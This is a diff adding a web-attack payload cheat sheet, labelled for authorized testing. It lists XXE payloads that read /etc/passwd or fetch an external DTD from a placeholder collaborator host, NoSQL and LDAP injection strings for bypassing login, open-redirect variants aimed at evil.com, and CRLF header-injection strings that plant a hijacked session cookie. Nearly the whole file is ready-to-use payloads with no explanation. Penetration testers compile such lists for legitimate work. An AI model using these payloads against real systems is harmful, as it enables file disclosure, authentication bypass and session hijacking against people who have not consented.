@@ -1,0 +1,48 @@
+# XXE, NoSQLi, LDAP, Open Redirect, CRLF — payloads (authorized testing)
+# Full sets in ../vendor/PayloadsAllTheThings/{XXE Injection,NoSQL Injection,LDAP Injection,Open Redirect,CRLF Injection}/
+
+## ===== XXE (XML External Entity) =====
+# Inject into endpoints that accept XML (SOAP, SVG/DOCX upload, XML API)
+<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>
+<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "http://YOUR-COLLABORATOR/">]><root>&xxe;</root>
+# Blind / OOB (external DTD):
+<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % ext SYSTEM "http://YOUR-COLLABORATOR/evil.dtd"> %ext;]><root>1</root>
+# PHP wrapper for exfiltration:
+<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
+
+## ===== NoSQL Injection (MongoDB etc.) =====
+# In a JSON body:
+{"username": {"$ne": null}, "password": {"$ne": null}}
+{"username": {"$gt": ""}, "password": {"$gt": ""}}
+{"username": "admin", "password": {"$regex": "^a"}}
+{"$where": "sleep(5000)"}
+# In the query string:
+username[$ne]=null&password[$ne]=null
+username[$gt]=&password[$gt]=
+# Auth bypass:
+{"username": {"$in": ["admin"]}, "password": {"$ne": "x"}}
+
+## ===== LDAP Injection =====
+*
+*)(uid=*
+*)(|(uid=*
+admin)(&))
+*)(|(objectclass=*))
+*)(mail=*))%00
+
+## ===== Open Redirect =====
+# Parameters: ?next= ?url= ?redirect= ?return= ?dest=
+https://evil.com
+//evil.com
+/\evil.com
+https:evil.com
+//google.com%2f%2e%2e
+/%09/evil.com
+https://trusted.com@evil.com
+https://trusted.com.evil.com
+
+## ===== CRLF Injection (header injection / response splitting) =====
+%0d%0aSet-Cookie:%20sessionid=hijack
+%0d%0aLocation:%20https://evil.com
+%0d%0a%0d%0a<script>alert(1)</script>
+test%0d%0aX-Injected:%20header
